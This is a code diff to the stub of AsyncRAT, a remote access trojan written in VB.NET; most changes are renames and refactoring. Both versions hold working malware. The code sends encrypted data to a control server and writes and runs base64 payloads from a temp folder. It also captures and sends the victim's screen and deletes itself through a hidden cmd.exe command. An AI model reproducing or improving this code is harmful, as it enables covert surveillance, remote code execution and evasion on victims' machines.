@@ -190,17 +190,17 @@ Namespace AsyncRAT_Stub
             If isConnected = True OrElse S.Connected Then
                 Try
                     Using MS As New MemoryStream
-                        Dim B As Byte() = AES_Encryptor(SB(msg))
-                        Dim L As Byte() = SB(B.Length & CChar(vbNullChar))
+                        Dim Buffer As Byte() = AES_Encryptor(SB(msg))
+                        Dim BufferLength As Byte() = SB(Buffer.Length & CChar(vbNullChar))
 
-                        MS.Write(L, 0, L.Length)
-                        MS.Write(B, 0, B.Length)
+                        MS.Write(BufferLength, 0, BufferLength.Length)
+                        MS.Write(Buffer, 0, Buffer.Length)
 
                         S.Poll(-1, SelectMode.SelectWrite)
                         S.BeginSend(MS.ToArray, 0, MS.Length, SocketFlags.None, New AsyncCallback(AddressOf EndSend), Nothing)
                     End Using
                 Catch ex As Exception
-                    Debug.WriteLine("Send")
+                    Debug.WriteLine("Send : Failed")
                     isConnected = False
                 End Try
             Else
@@ -208,11 +208,11 @@ Namespace AsyncRAT_Stub
             End If
         End Sub
 
-        Private Shared Sub EndSend(ByVal ar As IAsyncResult)
+        Public Shared Sub EndSend(ByVal ar As IAsyncResult)
             Try
                 S.EndSend(ar)
             Catch ex As Exception
-                Debug.WriteLine("EndSend")
+                Debug.WriteLine("EndSend : Failed")
                 isConnected = False
             End Try
         End Sub
@@ -309,7 +309,7 @@ Namespace AsyncRAT_Stub
                 Dim Temp As String = Path.GetTempFileName + Name
                 File.WriteAllBytes(Temp, Convert.FromBase64String(Data))
                 Thread.Sleep(500)
-                Diagnostics.Process.Start(Temp)
+                Process.Start(Temp)
                 If Update Then
                     SelfDelete()
                 End If
@@ -320,9 +320,9 @@ Namespace AsyncRAT_Stub
 
         Private Shared Sub SelfDelete()
             Try
-                Dim Del As New Diagnostics.ProcessStartInfo With {
-                    .Arguments = "/C choice /C Y /N /D Y /T 1 & Del " + Diagnostics.Process.GetCurrentProcess.MainModule.FileName,
-                    .WindowStyle = Diagnostics.ProcessWindowStyle.Hidden,
+                Dim Del As New ProcessStartInfo With {
+                    .Arguments = "/C choice /C Y /N /D Y /T 1 & Del " + Process.GetCurrentProcess.MainModule.FileName,
+                    .WindowStyle = ProcessWindowStyle.Hidden,
                     .CreateNoWindow = True,
                     .FileName = "cmd.exe"
                     }
@@ -333,7 +333,7 @@ Namespace AsyncRAT_Stub
                 Catch ex As Exception
                 End Try
 
-                Diagnostics.Process.Start(Del)
+                Process.Start(Del)
                 Environment.Exit(0)
             Catch ex As Exception
                 Program.Send("Msg" + SPL + ex.Message)
@@ -378,51 +378,59 @@ Namespace AsyncRAT_Stub
 
 
     Public Class RemoteDesktop
-
+        Public Shared Sync As Object = New Object
         Public Shared Sub Capture(ByVal W As Integer, ByVal H As Integer)
-            Try
-                Dim B As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
-                Dim g As Graphics = Graphics.FromImage(B)
-                g.CompositingQuality = CompositingQuality.HighSpeed
-                g.CopyFromScreen(0, 0, 0, 0, New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy)
-
-                Dim Resize As New Bitmap(W, H)
-                Dim g2 As Graphics = Graphics.FromImage(Resize)
-                g2.CompositingQuality = CompositingQuality.HighSpeed
-                g2.DrawImage(B, New Rectangle(0, 0, W, H), New Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), GraphicsUnit.Pixel)
-
-                Dim encoderParameter As EncoderParameter = New EncoderParameter(Imaging.Encoder.Quality, 50) '50 or 50+
-                Dim encoderInfo As ImageCodecInfo = GetEncoderInfo(ImageFormat.Jpeg)
-                Dim encoderParameters As EncoderParameters = New EncoderParameters(1)
-                encoderParameters.Param(0) = encoderParameter
-
-                Dim MS As New IO.MemoryStream
-                Resize.Save(MS, encoderInfo, encoderParameters)
+            SyncLock Sync
 
                 Try
-                    SyncLock Program.S
-                        Dim Bb As Byte() = AES_Encryptor(SB(("RD+" + Program.SPL + BS(MS.ToArray))))
-                        Dim L As Byte() = SB(Bb.Length & CChar(vbNullChar))
-                        Using MEM As New IO.MemoryStream
-                            MEM.Write(L, 0, L.Length)
-                            MEM.Write(Bb, 0, Bb.Length)
-                            Program.S.Poll(-1, Net.Sockets.SelectMode.SelectWrite)
-                            Program.S.Send(MEM.ToArray, 0, MEM.Length, Net.Sockets.SocketFlags.None)
+                    'Capture
+                    Dim ScreenSize As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
+                    Dim ImageScreenSize As Graphics = Graphics.FromImage(ScreenSize)
+                    ImageScreenSize.CompositingQuality = CompositingQuality.HighSpeed
+                    ImageScreenSize.CopyFromScreen(0, 0, 0, 0, New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy)
+
+                    'Resize
+                    Dim Resize As New Bitmap(W, H)
+                    Dim ImageResize As Graphics = Graphics.FromImage(Resize)
+                    ImageResize.CompositingQuality = CompositingQuality.HighSpeed
+                    ImageResize.DrawImage(ScreenSize, New Rectangle(0, 0, W, H), New Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), GraphicsUnit.Pixel)
+
+                    'compress
+                    Dim encoderParameter As EncoderParameter = New EncoderParameter(Imaging.Encoder.Quality, 50)
+                    Dim encoderInfo As ImageCodecInfo = GetEncoderInfo(ImageFormat.Jpeg)
+                    Dim encoderParameters As EncoderParameters = New EncoderParameters(1)
+                    encoderParameters.Param(0) = encoderParameter
+
+                    Dim MS As New MemoryStream
+                    Resize.Save(MS, encoderInfo, encoderParameters)
+
+                    Try
+                        Dim Buffer As Byte() = AES_Encryptor(SB(("RD+" + Program.SPL + BS(MS.ToArray))))
+                        Dim BufferLength As Byte() = SB(Buffer.Length & CChar(vbNullChar))
+                        Using MEM As New MemoryStream
+                            MEM.Write(BufferLength, 0, BufferLength.Length)
+                            MEM.Write(Buffer, 0, Buffer.Length)
+                            Program.S.Poll(-1, SelectMode.SelectWrite)
+                            Program.S.Send(MEM.ToArray, 0, MEM.Length, SocketFlags.None)
                         End Using
+                    Catch ex As Exception
+                        Program.isConnected = False
+                    End Try
 
-                    End SyncLock
+                    Try
+                        MS.Dispose()
+                        ImageScreenSize.Dispose()
+                        ImageResize.Dispose()
+                        Resize.Dispose()
+                        ScreenSize.Dispose()
+                    Catch ex As Exception
+                        Debug.WriteLine("Capture.Dispose" + ex.Message)
+                    End Try
+
                 Catch ex As Exception
-                    Program.isConnected = False
+                    Debug.WriteLine("Capture" + ex.Message)
                 End Try
-
-                Try : MS.Dispose() : Catch : End Try
-                Try : g.Dispose() : Catch : End Try
-                Try : g2.Dispose() : Catch : End Try
-                Try : Resize.Dispose() : Catch : End Try
-                Try : B.Dispose() : Catch : End Try
-
-            Catch ex As Exception
-            End Try
+            End SyncLock
 
         End Sub
 
@@ -467,7 +475,7 @@ Namespace AsyncRAT_Stub
         End Function
 
         Function GetHash(strToHash As String) As String
-            Dim md5Obj As New Cryptography.MD5CryptoServiceProvider
+            Dim md5Obj As New MD5CryptoServiceProvider
             Dim bytesToHash() As Byte = Encoding.ASCII.GetBytes(strToHash)
             bytesToHash = md5Obj.ComputeHash(bytesToHash)
             Dim strResult As New StringBuilder
@@ -478,13 +486,13 @@ Namespace AsyncRAT_Stub
         End Function
 
         Function AES_Encryptor(ByVal input As Byte()) As Byte()
-            Dim AES As New Cryptography.RijndaelManaged
-            Dim Hash As New Cryptography.MD5CryptoServiceProvider
+            Dim AES As New RijndaelManaged
+            Dim Hash As New MD5CryptoServiceProvider
             Dim ciphertext As String = ""
             Try
                 AES.Key = Hash.ComputeHash(SB(Settings.KEY))
-                AES.Mode = Cryptography.CipherMode.ECB
-                Dim DESEncrypter As Cryptography.ICryptoTransform = AES.CreateEncryptor
+                AES.Mode = CipherMode.ECB
+                Dim DESEncrypter As ICryptoTransform = AES.CreateEncryptor
                 Dim Buffer As Byte() = input
                 Return DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
             Catch ex As Exception
@@ -492,12 +500,12 @@ Namespace AsyncRAT_Stub
         End Function
 
         Function AES_Decryptor(ByVal input As Byte()) As Byte()
-            Dim AES As New Cryptography.RijndaelManaged
-            Dim Hash As New Cryptography.MD5CryptoServiceProvider
+            Dim AES As New RijndaelManaged
+            Dim Hash As New MD5CryptoServiceProvider
             Try
                 AES.Key = Hash.ComputeHash(SB(Settings.KEY))
-                AES.Mode = Cryptography.CipherMode.ECB
-                Dim DESDecrypter As Cryptography.ICryptoTransform = AES.CreateDecryptor
+                AES.Mode = CipherMode.ECB
+                Dim DESDecrypter As ICryptoTransform = AES.CreateDecryptor
                 Dim Buffer As Byte() = input
                 Return DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
             Catch ex As Exception
